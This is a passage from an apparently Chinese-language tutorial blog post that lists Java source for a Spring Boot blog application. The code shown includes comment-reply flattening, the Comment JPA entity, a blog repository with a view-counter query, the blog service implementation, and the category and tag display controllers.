(Comment comment : comments)&#123;</span><br><span class="line">            Comment c = <span class="keyword">new</span> Comment();</span><br><span class="line">            BeanUtils.copyProperties(comment,c);</span><br><span class="line">            commentsView.add(c);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//合并评论的各层子代到第一级子代集合中</span></span><br><span class="line">        combineChildren(commentsView);</span><br><span class="line">        <span class="keyword">return</span> commentsView;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> comments root根节点，blog不为null的对象集合</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">combineChildren</span><span class="params">(List&lt;Comment&gt; comments)</span></span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (Comment comment : comments)&#123;</span><br><span class="line">            List&lt;Comment&gt; replys = comment.getReplyComments();</span><br><span class="line">            <span class="keyword">for</span> (Comment reply : replys)&#123;</span><br><span class="line">                <span class="comment">//循环迭代,找出子代,存放在tempReplys中</span></span><br><span class="line">                recursively(reply);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//修改顶级节点的reply集合为迭代处理后的集合</span></span><br><span class="line">            comment.setReplyComments(tempReplys);</span><br><span class="line">            <span class="comment">//清除临时存放区</span></span><br><span class="line">            tempReplys = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//存放迭代找出的所有子代的集合</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; tempReplys = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 递归迭代，剥洋葱</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> comment 被迭代的对象</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">recursively</span><span class="params">(Comment comment)</span> </span>&#123;</span><br><span class="line">        tempReplys.add(comment);<span class="comment">//顶节点添加到临时存放集合</span></span><br><span class="line">        <span class="keyword">if</span> (comment.getReplyComments().size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">            List&lt;Comment&gt; replays = comment.getReplyComments();</span><br><span class="line">            <span class="keyword">for</span> (Comment reply : replays) &#123;</span><br><span class="line">                tempReplys.add(reply);</span><br><span class="line">                <span class="keyword">if</span> (reply.getReplyComments().size()&gt;<span class="number">0</span>) &#123;</span><br><span class="line">                    recursively(reply);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Comment.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.*;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/4.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;t_comment&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Comment</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Id</span></span><br><span class="line">    <span class="meta">@GeneratedValue</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">    <span class="keyword">private</span> String nickname;</span><br><span class="line">    <span class="keyword">private</span> String email;</span><br><span class="line">    <span class="keyword">private</span> String content;</span><br><span class="line">    <span class="keyword">private</span> String avatar;</span><br><span class="line">    <span class="meta">@Temporal(TemporalType.TIMESTAMP)</span></span><br><span class="line">    <span class="keyword">private</span> Date createTime;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> Blog blog;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@OneToMany(mappedBy = &quot;parentComment&quot;)</span></span><br><span class="line">    <span class="keyword">private</span> List&lt;Comment&gt; replyComments = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="meta">@ManyToOne</span></span><br><span class="line">    <span class="keyword">private</span> Comment parentComment;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">boolean</span> adminComment;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Comment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Long <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNickname</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nickname = nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(String email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getContent</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setContent</span><span class="params">(String content)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.content = content;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getAvatar</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAvatar</span><span class="params">(String avatar)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.avatar = avatar;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Date <span class="title">getCreateTime</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCreateTime</span><span class="params">(Date createTime)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.createTime = createTime;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.blog = blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Comment&gt; <span class="title">getReplyComments</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> replyComments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setReplyComments</span><span class="params">(List&lt;Comment&gt; replyComments)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.replyComments = replyComments;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Comment <span class="title">getParentComment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parentComment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setParentComment</span><span class="params">(Comment parentComment)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.parentComment = parentComment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isAdminComment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> adminComment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAdminComment</span><span class="params">(<span class="keyword">boolean</span> adminComment)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.adminComment = adminComment;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Comment&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, nickname=&#x27;&quot;</span> + nickname + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, email=&#x27;&quot;</span> + email + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, content=&#x27;&quot;</span> + content + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, avatar=&#x27;&quot;</span> + avatar + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, createTime=&quot;</span> + createTime +</span><br><span class="line">                <span class="string">&quot;, blog=&quot;</span> + blog +</span><br><span class="line">                <span class="string">&quot;, replyComments=&quot;</span> + replyComments +</span><br><span class="line">                <span class="string">&quot;, parentComment=&quot;</span> + parentComment +</span><br><span class="line">                <span class="string">&quot;, adminComment=&quot;</span> + adminComment +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="浏览次数模块"><a href="#浏览次数模块" class="headerlink" title="浏览次数模块"></a>浏览次数模块</h3><p>BlogRepository.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.dao;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaSpecificationExecutor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Modifying;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.Query;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">BlogRepository</span> <span class="keyword">extends</span> <span class="title">JpaRepository</span>&lt;<span class="title">Blog</span>,<span class="title">Long</span>&gt;, <span class="title">JpaSpecificationExecutor</span>&lt;<span class="title">Blog</span>&gt; </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.recommend = true&quot;)</span></span><br><span class="line">    <span class="function">List&lt;Blog&gt; <span class="title">findTop</span><span class="params">(Pageable pageable)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//select * from t_blog where title like &#x27;%内容%&#x27;</span></span><br><span class="line">    <span class="meta">@Query(&quot;select b from Blog b where b.title like ?1 or b.content like ?1&quot;)</span></span><br><span class="line">    <span class="function">Page&lt;Blog&gt; <span class="title">findByQuery</span><span class="params">(String query,Pageable pageable)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Modifying</span></span><br><span class="line">    <span class="meta">@Query(&quot;update Blog b set b.views = b.views+1 where b.id = ?1&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">updateViews</span><span class="params">(Long id)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogServiceImpl.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.NotFoundException;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.dao.BlogRepository;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MarkdownUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.util.MyBeanUtils;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeanUtils;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.PageRequest;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.domain.Specification;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Service;</span><br><span class="line"><span class="keyword">import</span> org.springframework.transaction.annotation.Transactional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaBuilder;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.CriteriaQuery;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Predicate;</span><br><span class="line"><span class="keyword">import</span> javax.persistence.criteria.Root;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/2/8.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BlogServiceImpl</span> <span class="keyword">implements</span> <span class="title">BlogService</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogRepository blogRepository;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findById(id).get();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable, BlogQuery blogQuery)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(<span class="keyword">new</span> Specification&lt;Blog&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Predicate <span class="title">toPredicate</span><span class="params">(Root&lt;Blog&gt; root, CriteriaQuery&lt;?&gt; criteriaQuery, CriteriaBuilder criteriaBuilder)</span> </span>&#123;</span><br><span class="line">                List&lt;Predicate&gt; predicateList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">                <span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(blogQuery.getTitle()) &amp;&amp; blogQuery.getTitle() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.like(root.&lt;String&gt;get(<span class="string">&quot;title&quot;</span>),<span class="string">&quot;%&quot;</span>+blogQuery.getTitle()+<span class="string">&quot;%&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.getTypeID() != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Type&gt;get(<span class="string">&quot;type&quot;</span>).get(<span class="string">&quot;id&quot;</span>),blogQuery.getTypeID()));</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (blogQuery.isRecommend())&#123;</span><br><span class="line">                    predicateList.add(criteriaBuilder.equal(root.&lt;Boolean&gt;get(<span class="string">&quot;recommend&quot;</span>),blogQuery.isRecommend()));</span><br><span class="line">                &#125;</span><br><span class="line">                criteriaQuery.where(predicateList.toArray(<span class="keyword">new</span> Predicate[predicateList.size()]));</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findAll(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Page&lt;Blog&gt; <span class="title">listBlog</span><span class="params">(String query, Pageable pageable)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findByQuery(query,pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">getAndConvert</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        Blog blog = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (blog == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;博客不存在哦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Blog b = <span class="keyword">new</span> Blog();</span><br><span class="line">        BeanUtils.copyProperties(blog,b);</span><br><span class="line">        String content = b.getContent();</span><br><span class="line">        b.setContent(MarkdownUtils.markdownToHtmlExtensions(content));</span><br><span class="line">        blogRepository.updateViews(id);</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Blog&gt; <span class="title">listRecommendBlogTop</span><span class="params">(Integer size)</span> </span>&#123;</span><br><span class="line">        Sort sort = Sort.by(Sort.Direction.DESC,<span class="string">&quot;updateTime&quot;</span>);</span><br><span class="line">        Pageable pageable = PageRequest.of(<span class="number">0</span>,size,sort);</span><br><span class="line">        <span class="keyword">return</span> blogRepository.findTop(pageable);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">saveBlog</span><span class="params">(Blog blog)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (blog.getId() == <span class="keyword">null</span>)&#123;</span><br><span class="line">            blog.setCreateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">            blog.setViews(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            blog.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Blog <span class="title">updateBlog</span><span class="params">(Long id, Blog blog)</span> </span>&#123;</span><br><span class="line">        Blog b = blogRepository.findById(id).get();</span><br><span class="line">        <span class="keyword">if</span> (b == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NotFoundException(<span class="string">&quot;管理员大大,这个博客不存在哦！～(　TロT)σ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        BeanUtils.copyProperties(blog,b, MyBeanUtils.getNullPropertyNames(blog));</span><br><span class="line">        b.setUpdateTime(<span class="keyword">new</span> Date());</span><br><span class="line">        <span class="keyword">return</span> blogRepository.save(b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Transactional</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteBlog</span><span class="params">(Long id)</span> </span>&#123;</span><br><span class="line">        blogRepository.deleteById(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分类Web模块"><a href="#分类Web模块" class="headerlink" title="分类Web模块"></a>分类Web模块</h3><p>TypeShowController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/12/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TypeShowController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TypeService typeService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/types/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">types</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable,<span class="meta">@PathVariable</span> Long id, Model model)</span></span>&#123;</span><br><span class="line">        List&lt;Type&gt; types = typeService.listTypeTop(<span class="number">10000</span>);</span><br><span class="line">        <span class="keyword">if</span> (id == -<span class="number">1</span>)&#123;</span><br><span class="line">            id = types.get(<span class="number">0</span>).getId();</span><br><span class="line">        &#125;</span><br><span class="line">        BlogQuery blogQuery = <span class="keyword">new</span> BlogQuery();</span><br><span class="line">        blogQuery.setTypeID(id);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;types&quot;</span>,types);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(pageable,blogQuery));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;activeTypeId&quot;</span>,id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;types&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="标签Web模块"><a href="#标签Web模块" class="headerlink" title="标签Web模块"></a>标签Web模块</h3><p>TagShowController.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Tag;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Type;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.BlogService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TagService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.service.TypeService;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Pageable;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Sort;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.web.PageableDefault;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PathVariable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  Created by Arvin on 2021/12/16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TagShowController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> TagService tagService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> BlogService blogService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/tags/&#123;id&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">tags</span><span class="params">(<span class="meta">@PageableDefault(size = 10,sort = &#123;&quot;updateTime&quot;&#125;,direction = Sort.Direction.DESC)</span>Pageable pageable,<span class="meta">@PathVariable</span> Long id, Model model)</span></span>&#123;</span><br><span class="line">        List&lt;Tag&gt; tags = tagService.listTagTop(<span class="number">10000</span>);</span><br><span class="line">        <span class="keyword">if</span> (id == -<span class="number">1</span>)&#123;</span><br><span class="line">            id = tags.get(<span class="number">0</span>).getId();</span><br><span class="line">        &#125;</span><br><span class="line">        model.addAttribute(<span class="string">&quot;tags&quot;</span>,tags);</span><br><span class="line">        model.addAttribute(<span class="string">&quot;page&quot;</span>,blogService.listBlog(id,pageable));</span><br><span class="line">        model.addAttribute(<span class="string">&quot;activeTagId&quot;</span>,id);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;tags&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BlogService.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cxkj.blog.service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.pojo.Blog;</span><br><span class="line"><span class="keyword">import</span> com.cxkj.blog.vo.BlogQuery;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.domain.Page;</span><br><span class="line"><span class="keyword">import</span> 